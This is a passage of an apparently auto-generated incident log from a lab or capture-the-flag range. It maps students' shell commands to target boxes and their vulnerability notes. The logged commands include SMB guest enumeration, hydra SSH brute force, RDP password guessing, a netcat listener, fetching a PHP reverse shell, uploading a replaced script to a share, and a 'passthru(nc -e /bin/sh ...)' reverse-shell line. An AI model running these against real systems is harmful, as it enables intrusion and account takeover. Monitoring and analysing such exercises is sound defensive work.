  - 2026-01-27T19:21:21 | logs/10.100.7.22/shell_history.csv#L226 | ls
  - 2026-01-27T19:21:27 | logs/10.100.7.22/shell_history.csv#L227 | vim credentials.txt

## Incident 49 - 2026-01-27T19:21:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:21:53 | logs/10.100.7.33/shell_history.csv#L117 | nxc smb 10.100.7.46 -u ember -p ''
  - 2026-01-27T19:21:37 | logs/10.100.7.34/shell_history.csv#L74 | nxc smb 10.100.7.46 u-username p-password --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 50 - 2026-01-27T19:22:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:22:50 | logs/10.100.7.21/shell_history.csv#L94 | netexec smb 10.100.7.40
  - 2026-01-27T19:22:11 | logs/10.100.7.22/shell_history.csv#L228 | ssh solaris@10.100.7.40

## Incident 51 - 2026-01-27T19:22:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:22:13 | logs/10.100.7.33/shell_history.csv#L118 | nxc smb 10.100.7.46 -u guest -p'' --shares
  - 2026-01-27T19:22:36 | logs/10.100.7.33/shell_history.csv#L119 | nxc smb 10.100.7.46 -u guest -p " --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 52 - 2026-01-27T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:22:41 | logs/10.100.7.32/shell_history.csv#L659 | ls
  - 2026-01-27T19:22:42 | logs/10.100.7.32/shell_history.csv#L660 | cat maintenance.ps1
  - 2026-01-27T19:22:12 | logs/10.100.7.22/shell_history.csv#L229 | ls
  - 2026-01-27T19:22:19 | logs/10.100.7.22/shell_history.csv#L230 | rm backup.zip
  - 2026-01-27T19:22:23 | logs/10.100.7.22/shell_history.csv#L231 | rm credentials.txt

## Incident 53 - 2026-01-27T19:23:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:23:42 | logs/10.100.7.21/shell_history.csv#L95 | netexec smb 10.100.7.46
  - 2026-01-27T19:23:04 | logs/10.100.7.33/shell_history.csv#L120 | nxc smb 10.100.7.46 -u guest -p " --shares
  - 2026-01-27T19:23:04 | logs/10.100.7.33/shell_history.csv#L121 | nxc smb 10.100.7.46 -u guest -p " --shares
  - 2026-01-27T19:23:51 | logs/10.100.7.33/shell_history.csv#L122 | smbclient //10.100.7.46/Scripts --guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 54 - 2026-01-27T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:23:59 | logs/10.100.7.33/shell_history.csv#L123 | tldr smbclient
  - 2026-01-27T19:23:26 | logs/10.100.7.22/shell_history.csv#L233 | unzip backup.zip
  - 2026-01-27T19:23:33 | logs/10.100.7.22/shell_history.csv#L234 | vim credentials.txt

## Incident 55 - 2026-01-27T19:29:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:29:14 | logs/10.100.7.21/shell_history.csv#L96 | cd ..
  - 2026-01-27T19:29:17 | logs/10.100.7.21/shell_history.csv#L97 | cd ..
  - 2026-01-27T19:29:20 | logs/10.100.7.21/shell_history.csv#L98 | ls
  - 2026-01-27T19:29:26 | logs/10.100.7.21/shell_history.csv#L99 | cd gobuster
  - 2026-01-27T19:29:34 | logs/10.100.7.32/shell_history.csv#L664 | cat maintenance.ps1
  - 2026-01-27T19:29:42 | logs/10.100.7.32/shell_history.csv#L665 | ls
  - 2026-01-27T19:29:44 | logs/10.100.7.32/shell_history.csv#L666 | cat maintenance.ps1
  - 2026-01-27T19:29:27 | logs/10.100.7.13/shell_history.csv#L223 | smbclient //pyre/public --user guest

## Incident 56 - 2026-01-27T19:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:30:10 | logs/10.100.7.21/shell_history.csv#L100 | cd /wordlists
  - 2026-01-27T19:30:13 | logs/10.100.7.21/shell_history.csv#L101 | cd ~
  - 2026-01-27T19:30:19 | logs/10.100.7.21/shell_history.csv#L102 | cd /wordlists
  - 2026-01-27T19:30:28 | logs/10.100.7.21/shell_history.csv#L103 | cd /etc
  - 2026-01-27T19:30:29 | logs/10.100.7.21/shell_history.csv#L104 | ls
  - 2026-01-27T19:30:34 | logs/10.100.7.21/shell_history.csv#L105 | cd /etc/wordlists

## Incident 57 - 2026-01-27T19:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:31:05 | logs/10.100.7.21/shell_history.csv#L106 | wordlists
  - 2026-01-27T19:31:17 | logs/10.100.7.21/shell_history.csv#L107 | wordlists
  - 2026-01-27T19:31:29 | logs/10.100.7.21/shell_history.csv#L108 | wordlists
  - 2026-01-27T19:31:38 | logs/10.100.7.21/shell_history.csv#L109 | cd ~
  - 2026-01-27T19:31:50 | logs/10.100.7.21/shell_history.csv#L110 | cd /usr/share/dirbuster/wordlists
  - 2026-01-27T19:31:52 | logs/10.100.7.21/shell_history.csv#L111 | ls
  - 2026-01-27T19:31:23 | logs/10.100.7.32/shell_history.csv#L667 | vi maintenance.ps1
  - 2026-01-27T19:31:24 | logs/10.100.7.32/shell_history.csv#L668 | cat maintenance.ps1
  - 2026-01-27T19:31:26 | logs/10.100.7.32/shell_history.csv#L669 | cat maintenance.ps1
  - 2026-01-27T19:31:33 | logs/10.100.7.32/shell_history.csv#L671 | ls
  - 2026-01-27T19:31:34 | logs/10.100.7.32/shell_history.csv#L672 | cat maintenance.ps1
  - 2026-01-27T19:31:37 | logs/10.100.7.32/shell_history.csv#L673 | cat maintenance.ps1
  - 2026-01-27T19:31:37 | logs/10.100.7.32/shell_history.csv#L674 | ls
  - 2026-01-27T19:31:44 | logs/10.100.7.32/shell_history.csv#L675 | vi maintenance.ps1

## Incident 58 - 2026-01-27T19:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:32:21 | logs/10.100.7.32/shell_history.csv#L676 | ls
  - 2026-01-27T19:32:22 | logs/10.100.7.32/shell_history.csv#L677 | ls
  - 2026-01-27T19:32:23 | logs/10.100.7.32/shell_history.csv#L678 | cat maintenance.ps1
  - 2026-01-27T19:32:24 | logs/10.100.7.32/shell_history.csv#L679 | ls
  - 2026-01-27T19:32:25 | logs/10.100.7.32/shell_history.csv#L680 | rm nmap_log.txt
  - 2026-01-27T19:32:25 | logs/10.100.7.32/shell_history.csv#L681 | ls
  - 2026-01-27T19:32:28 | logs/10.100.7.32/shell_history.csv#L682 | mv maintenance.ps1 Documents
  - 2026-01-27T19:32:28 | logs/10.100.7.32/shell_history.csv#L683 | ls
  - 2026-01-27T19:32:29 | logs/10.100.7.32/shell_history.csv#L684 | cd Documents
  - 2026-01-27T19:32:29 | logs/10.100.7.32/shell_history.csv#L685 | ls
  - 2026-01-27T19:32:31 | logs/10.100.7.32/shell_history.csv#L686 | vi maintenance.

## Incident 59 - 2026-01-27T19:32:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:32:00 | logs/10.100.7.13/shell_history.csv#L226 | nmap 10.100.7.45 -p 445
  - 2026-01-27T19:32:46 | logs/10.100.7.13/shell_history.csv#L227 | nxc smb 10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 60 - 2026-01-27T19:35:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:35:40 | logs/10.100.7.32/shell_history.csv#L689 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:35:19 | logs/10.100.7.14/shell_history.csv#L357 | dirbuster -u 10.100.7.46 -e
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 61 - 2026-01-27T19:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:35:23 | logs/10.100.7.14/shell_history.csv#L358 | ls
  - 2026-01-27T19:35:59 | logs/10.100.7.22/shell_history.csv#L236 | nc -lvnp 4444

## Incident 62 - 2026-01-27T19:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:39:35 | logs/10.100.7.21/shell_history.csv#L116 | git clone https://github.com/pentestmonkey/php-reverse-shell.git
  - 2026-01-27T19:39:39 | logs/10.100.7.21/shell_history.csv#L117 | cd ~
  - 2026-01-27T19:39:44 | logs/10.100.7.21/shell_history.csv#L118 | git clone https://github.com/pentestmonkey/php-reverse-shell.git
  - 2026-01-27T19:39:50 | logs/10.100.7.21/shell_history.csv#L119 | wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

## Incident 63 - 2026-01-27T19:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:42:03 | logs/10.100.7.21/shell_history.csv#L121 | cd /usr/share/dirbuster/wordlists
  - 2026-01-27T19:42:09 | logs/10.100.7.32/shell_history.csv#L692 | ls
  - 2026-01-27T19:42:18 | logs/10.100.7.32/shell_history.csv#L693 | ls
  - 2026-01-27T19:42:19 | logs/10.100.7.32/shell_history.csv#L694 | cat maintenance.log
  - 2026-01-27T19:42:20 | logs/10.100.7.32/shell_history.csv#L695 | cd ..
  - 2026-01-27T19:42:21 | logs/10.100.7.32/shell_history.csv#L696 | ls
  - 2026-01-27T19:42:22 | logs/10.100.7.32/shell_history.csv#L697 | cat maintenance.ps1

## Incident 64 - 2026-01-27T19:46:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:46:07 | logs/10.100.7.21/shell_history.csv#L123 | gobuster dir -u http://10.100.7.45/ -w directory-list-2.3-medium.txt
  - 2026-01-27T19:46:39 | logs/10.100.7.21/shell_history.csv#L125 | gobuster dir -u http://10.100.7.45/ -w directory-listt-lowercase-2.3-small.txt
  - 2026-01-27T19:46:57 | logs/10.100.7.21/shell_history.csv#L126 | gobuster dir -u http://10.100.7.45/ -w directory-list-lowercase-2.3-small.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 65 - 2026-01-27T19:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:46:13 | logs/10.100.7.21/shell_history.csv#L124 | ls
  - 2026-01-27T19:46:56 | logs/10.100.7.11/shell_history.csv#L204 | exit
  - 2026-01-27T19:46:16 | logs/10.100.7.32/shell_history.csv#L705 | ls
  - 2026-01-27T19:46:18 | logs/10.100.7.32/shell_history.csv#L706 | ls
  - 2026-01-27T19:46:20 | logs/10.100.7.32/shell_history.csv#L707 | ls
  - 2026-01-27T19:46:23 | logs/10.100.7.32/shell_history.csv#L708 | ls
  - 2026-01-27T19:46:50 | logs/10.100.7.22/shell_history.csv#L237 | vim php-reverse-shell.php

## Incident 66 - 2026-01-27T19:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:47:51 | logs/10.100.7.21/shell_history.csv#L128 | ls
  - 2026-01-27T19:47:18 | logs/10.100.7.11/shell_history.csv#L205 | history
  - 2026-01-27T19:47:40 | logs/10.100.7.11/shell_history.csv#L206 | exit
  - 2026-01-27T19:47:14 | logs/10.100.7.22/shell_history.csv#L238 | vim solariskey
  - 2026-01-27T19:47:34 | logs/10.100.7.22/shell_history.csv#L239 | chmod 600 solariskey

## Incident 67 - 2026-01-27T19:47:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:47:22 | logs/10.100.7.24/shell_history.csv#L282 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T19:47:24 | logs/10.100.7.24/shell_history.csv#L283 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 68 - 2026-01-27T19:48:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:48:19 | logs/10.100.7.32/shell_history.csv#L709 | while true; do smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'; done
  - 2026-01-27T19:48:26 | logs/10.100.7.32/shell_history.csv#L710 | while true; do smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'; done
  - 2026-01-27T19:48:28 | logs/10.100.7.32/shell_history.csv#L711 | while true; do smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'; done
  - 2026-01-27T19:48:33 | logs/10.100.7.32/shell_history.csv#L712 | nxc smb 10.100.7.46 -u rand2 -p 'f?D07VdW6S$)' --shares
  - 2026-01-27T19:48:46 | logs/10.100.7.32/shell_history.csv#L713 | nxc smb 10.100.7.46 -u guest -p '' --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 69 - 2026-01-27T19:51:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:51:06 | logs/10.100.7.21/shell_history.csv#L130 | clear
  - 2026-01-27T19:51:10 | logs/10.100.7.11/shell_history.csv#L207 | penelope
  - 2026-01-27T19:51:00 | logs/10.100.7.14/shell_history.csv#L366 | cd wordlist
  - 2026-01-27T19:51:04 | logs/10.100.7.14/shell_history.csv#L367 | ls
  - 2026-01-27T19:51:11 | logs/10.100.7.14/shell_history.csv#L368 | cd INjections
  - 2026-01-27T19:51:16 | logs/10.100.7.14/shell_history.csv#L369 | cd Injections
  - 2026-01-27T19:51:19 | logs/10.100.7.14/shell_history.csv#L370 | ls
  - 2026-01-27T19:51:34 | logs/10.100.7.14/shell_history.csv#L371 | wget All_attack.txt
  - 2026-01-27T19:51:44 | logs/10.100.7.14/shell_history.csv#L372 | get All-attack.txt

## Incident 70 - 2026-01-27T19:51:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:51:17 | logs/10.100.7.24/shell_history.csv#L284 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:51:30 | logs/10.100.7.24/shell_history.csv#L285 | xfreerdp3 /u:rand /v:10.100.7.46 /p:^[[200~WC-.8Us=123
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 71 - 2026-01-27T19:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:57:43 | logs/10.100.7.21/shell_history.csv#L131 | cd ~
  - 2026-01-27T19:57:09 | logs/10.100.7.12/shell_history.csv#L48 | sqlcmd
  - 2026-01-27T19:57:22 | logs/10.100.7.12/shell_history.csv#L49 | tldr

## Incident 72 - 2026-01-27T19:57:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:57:15 | logs/10.100.7.24/shell_history.csv#L287 | xfreerdp3 /u:rand /v:10.100.7.46 /p:WC-.8Us=123
  - 2026-01-27T19:57:15 | logs/10.100.7.24/shell_history.csv#L288 | xfreerdp3 /u:rand /v:10.100.7.46 /p:WC-.8Us=123
  - 2026-01-27T19:57:50 | logs/10.100.7.24/shell_history.csv#L289 | xfreerdp3 /u:rand /v:10.100.7.46 /p:PNqRrcXU4W0eWaE1MGvy
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 73 - 2026-01-27T19:58:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:58:31 | logs/10.100.7.14/shell_history.csv#L376 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45
  - 2026-01-27T19:58:44 | logs/10.100.7.14/shell_history.csv#L377 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 74 - 2026-01-27T20:13:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:13:17 | logs/10.100.7.32/shell_history.csv#L741 | curl http://10.100.7.45/
  - 2026-01-27T20:13:20 | logs/10.100.7.32/shell_history.csv#L742 | curl http://10.100.7.45/sources
  - 2026-01-27T20:13:22 | logs/10.100.7.32/shell_history.csv#L743 | curl http://10.100.7.45/assets
  - 2026-01-27T20:13:24 | logs/10.100.7.32/shell_history.csv#L744 | curl http://10.100.7.45/assets/
  - 2026-01-27T20:13:51 | logs/10.100.7.32/shell_history.csv#L745 | curl http://10.100.7.45/assets/
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 75 - 2026-01-08T18:50:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T18:50:03 | logs/10.100.7.11/shell_history.csv#L2 | sudo bash
  - 2026-01-08T18:50:11 | logs/10.100.7.11/shell_history.csv#L3 | exit
  - 2026-01-08T18:50:14 | logs/10.100.7.11/shell_history.csv#L4 | cat .full_research_history.csv
  - 2026-01-08T18:50:23 | logs/10.100.7.11/shell_history.csv#L5 | exit
  - 2026-01-08T18:50:37 | logs/10.100.7.11/shell_history.csv#L6 | sudo bash

## Incident 76 - 2026-01-12T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:22:12 | logs/10.100.7.11/shell_history.csv#L8 | exit
  - 2026-01-12T19:22:19 | logs/10.100.7.11/shell_history.csv#L9 | pwd
  - 2026-01-12T19:22:03 | logs/10.100.7.14/shell_history.csv#L16 | exit
  - 2026-01-12T19:22:16 | logs/10.100.7.14/shell_history.csv#L17 | cat .full_research_history.csv
  - 2026-01-12T19:22:37 | logs/10.100.7.13/shell_history.csv#L23 | cd home
  - 2026-01-12T19:22:40 | logs/10.100.7.13/shell_history.csv#L24 | ls
  - 2026-01-12T19:22:43 | logs/10.100.7.13/shell_history.csv#L25 | cd kali
  - 2026-01-12T19:22:44 | logs/10.100.7.13/shell_history.csv#L26 | ls

## Incident 77 - 2026-01-12T19:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:30:00 | logs/10.100.7.34/shell_history.csv#L4 | exit
  - 2026-01-12T19:30:08 | logs/10.100.7.34/shell_history.csv#L5 | xfreerdp3

## Incident 78 - 2026-01-12T19:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:45:03 | logs/10.100.7.14/shell_history.csv#L24 | cd psswd
  - 2026-01-12T19:45:06 | logs/10.100.7.14/shell_history.csv#L25 | cd /psswd
  - 2026-01-12T19:45:08 | logs/10.100.7.14/shell_history.csv#L26 | ls

## Incident 79 - 2026-01-12T20:01:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T20:01:37 | logs/10.100.7.11/shell_history.csv#L13 | hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.40
  - 2026-01-12T20:01:59 | logs/10.100.7.32/shell_history.csv#L150 | ssh root@10.100.7.40
  - 2026-01-12T20:01:28 | logs/10.100.7.22/shell_history.csv#L45 | ssh solaris@10.100.7.40

## Incident 80 - 2026-01-12T20:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T20:01:17 | logs/10.100.7.34/shell_history.csv#L17 | sudo apt install ncx
  - 2026-01-12T20:01:26 | logs/10.100.7.34/shell_history.csv#L18 | sudo apt install nxc
  - 2026-01-12T20:01:52 | logs/10.100.7.34/shell_history.csv#L19 | pipx install nxc

## Incident 81 - 2026-01-13T19:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:01:49 | logs/10.100.7.11/shell_history.csv#L14 | ls
  - 2026-01-13T19:01:53 | logs/10.100.7.11/shell_history.csv#L15 | cd .../../..

## Incident 82 - 2026-01-13T19:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:02:01 | logs/10.100.7.11/shell_history.csv#L16 | cd ~
  - 2026-01-13T19:02:04 | logs/10.100.7.11/shell_history.csv#L17 | ls
  - 2026-01-13T19:02:10 | logs/10.100.7.11/shell_history.csv#L18 | pwd
  - 2026-01-13T19:02:32 | logs/10.100.7.11/shell_history.csv#L19 | clear

## Incident 83 - 2026-01-13T19:02:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:02:32 | logs/10.100.7.24/shell_history.csv#L21 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:02:50 | logs/10.100.7.24/shell_history.csv#L22 | smbclient //10.100.7.42/public
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 84 - 2026-01-13T19:03:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T19:03:15 | logs/10.100.7.32/shell_history.csv#L237 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43
  - 2026-01-13T19:03:26 | logs/10.100.7.32/shell_history.csv#L238 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.43

## Incident 85 - 2026-01-13T19:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:03:09 | logs/10.100.7.13/shell_history.csv#L35 | sudo bash
  - 2026-01-13T19:03:54 | logs/10.100.7.22/shell_history.csv#L58 | ls

## Incident 86 - 2026-01-13T19:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:04:21 | logs/10.100.7.11/shell_history.csv#L21 | tldr smb
  - 2026-01-13T19:04:24 | logs/10.100.7.11/shell_history.csv#L22 | ls
  - 2026-01-13T19:04:29 | logs/10.100.7.11/shell_history.csv#L23 | tldr smb
  - 2026-01-13T19:04:36 | logs/10.100.7.11/shell_history.csv#L24 | tldr smbdclient
  - 2026-01-13T19:04:40 | logs/10.100.7.11/shell_history.csv#L25 | tldr smbclient
  - 2026-01-13T19:04:29 | logs/10.100.7.22/shell_history.csv#L59 | vim hashes.txt
  - 2026-01-13T19:04:49 | logs/10.100.7.22/shell_history.csv#L60 | vim hashes.txt
  - 2026-01-13T19:04:21 | logs/10.100.7.24/shell_history.csv#L24 | ls
  - 2026-01-13T19:04:56 | logs/10.100.7.24/shell_history.csv#L26 | unzip backup.zip

## Incident 87 - 2026-01-13T19:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:05:52 | logs/10.100.7.11/shell_history.csv#L26 | tldr hydra
  - 2026-01-13T19:05:59 | logs/10.100.7.11/shell_history.csv#L27 | tldr --update
  - 2026-01-13T19:05:03 | logs/10.100.7.24/shell_history.csv#L27 | vim credentials.txt

## Incident 88 - 2026-01-13T19:05:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:05:31 | logs/10.100.7.34/shell_history.csv#L20 | ^[[200~nmap 10.100.7.42 -p 445~
  - 2026-01-13T19:05:35 | logs/10.100.7.34/shell_history.csv#L21 | nmap 10.100.7.42 -p 445
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 89 - 2026-01-13T19:05:00
- Target IP: 10.100.7.14
- Target Box: None
- Entries:
  - 2026-01-13T19:05:23 | logs/10.100.7.14/shell_history.csv#L39 | passthru(nc -e /bin/sh 10.100.7.14 8888);
nc -vv -l -p 8888
  - 2026-01-13T19:05:47 | logs/10.100.7.14/shell_history.csv#L40 | passthru(nc -e /bin/sh 10.100.7.14 8888);

## Incident 90 - 2026-01-13T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:06:03 | logs/10.100.7.11/shell_history.csv#L28 | tldr hydra
  - 2026-01-13T19:06:16 | logs/10.100.7.13/shell_history.csv#L37 | sudo apt install tldr
  - 2026-01-13T19:06:46 | logs/10.100.7.13/shell_history.csv#L38 | sudo apt install tealdeer

## Incident 91 - 2026-01-13T19:09:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:09:10 | logs/10.100.7.11/shell_history.csv#L30 | nmap 10.100.7.40 -p 445
  - 2026-01-13T19:09:41 | logs/10.100.7.11/shell_history.csv#L31 | nxc smb 10.100.7.40

## Incident 92 - 2026-01-13T19:11:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:11:22 | logs/10.100.7.11/shell_history.csv#L32 | nxc smb 10.100.7.40 -u guest -p
  - 2026-01-13T19:11:47 | logs/10.100.7.11/shell_history.csv#L33 | nxc smb 10.100.7.40 -u guest -p ''
  - 2026-01-13T19:11:54 | logs/10.100.7.22/shell_history.csv#L61 | nmap -sV -p 1-65535 -T3 10.100.7.40-43
  - 2026-01-13T19:11:00 | logs/10.100.7.24/shell_history.csv#L28 | ssh 10.100.7.40
  - 2026-01-13T19:11:33 | logs/10.100.7.24/shell_history.csv#L30 | ssh 10.100.7.40
  - 2026-01-13T19:11:34 | logs/10.100.7.24/shell_history.csv#L31 | ssh 10.100.7.40
  - 2026-01-13T19:11:48 | logs/10.100.7.24/shell_history.csv#L32 | ssh 10.100.7.40

## Incident 93 - 2026-01-13T19:14:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:14:34 | logs/10.100.7.33/shell_history.csv#L4 | exit
  - 2026-01-13T19:14:34 | logs/10.100.7.33/shell_history.csv#L5 | exit

## Incident 94 - 2026-01-13T19:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:15:37 | logs/10.100.7.11/shell_history.csv#L35 | smbclient //server/share --user guest
  - 2026-01-13T19:15:41 | logs/10.100.7.11/shell_history.csv#L36 | smbclient //server/share --user guest
  - 2026-01-13T19:15:47 | logs/10.100.7.11/shell_history.csv#L37 | smbclient //server/share --user guest
  - 2026-01-13T19:15:47 | logs/10.100.7.34/shell_history.csv#L29 | tldr nxc smb

## Incident 95 - 2026-01-13T19:15:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:15:52 | logs/10.100.7.13/shell_history.csv#L41 | ssh ubuntu@10.100.7.40
  - 2026-01-13T19:15:52 | logs/10.100.7.13/shell_history.csv#L42 | ssh ubuntu@10.100.7.40
  - 2026-01-13T19:15:52 | logs/10.100.7.13/shell_history.csv#L43 | ssh ubuntu@10.100.7.40
  - 2026-01-13T19:15:52 | logs/10.100.7.13/shell_history.csv#L44 | ssh ubuntu@10.100.7.40
  - 2026-01-13T19:15:52 | logs/10.100.7.13/shell_history.csv#L45 | ssh ubuntu@10.100.7.40

## Incident 96 - 2026-01-13T19:15:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-13T19:15:18 | logs/10.100.7.24/shell_history.csv#L39 | ssh helios@10.100.7.41
  - 2026-01-13T19:15:50 | logs/10.100.7.24/shell_history.csv#L40 | xfreerdp3 /u:helios /v:10.100.7.41 /p:DARKSIDE
  - 2026-01-13T19:15:53 | logs/10.100.7.24/shell_history.csv#L41 | xfreerdp3 /u:helios /v:10.100.7.41 /p:DARKSIDE

## Incident 97 - 2026-01-13T19:16:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:16:05 | logs/10.100.7.11/shell_history.csv#L38 | passwd guest
  - 2026-01-13T19:16:09 | logs/10.100.7.11/shell_history.csv#L39 | passwd solarid
  - 2026-01-13T19:16:12 | logs/10.100.7.11/shell_history.csv#L40 | passwd solaris
  - 2026-01-13T19:16:23 | logs/10.100.7.11/shell_history.csv#L41 | users

## Incident 98 - 2026-01-13T19:16:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:16:14 | logs/10.100.7.13/shell_history.csv#L46 | ssh scoring_user@10.100.7.40
  - 2026-01-13T19:16:37 | logs/10.100.7.13/shell_history.csv#L47 | ssh solaris@10.100.7.40
  - 2026-01-13T19:16:37 | logs/10.100.7.13/shell_history.csv#L48 | ssh solaris@10.100.7.40

## Incident 99 - 2026-01-13T19:16:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-13T19:16:01 | logs/10.100.7.24/shell_history.csv#L42 | xfreerdp3 /u:helios /v:10.100.7.41 /p:Classof07
  - 2026-01-13T19:16:11 | logs/10.100.7.24/shell_history.csv#L43 | xfreerdp3 /u:helios /v:10.100.7.41 /p:Kassidy
  - 2026-01-13T19:16:19 | logs/10.100.7.24/shell_history.csv#L44 | xfreerdp3 /u:helios /v:10.100.7.41 /p:password
  - 2026-01-13T19:16:23 | logs/10.100.7.24/shell_history.csv#L45 | xfreerdp3 /u:helios /v:10.100.7.41 /p:nirvana
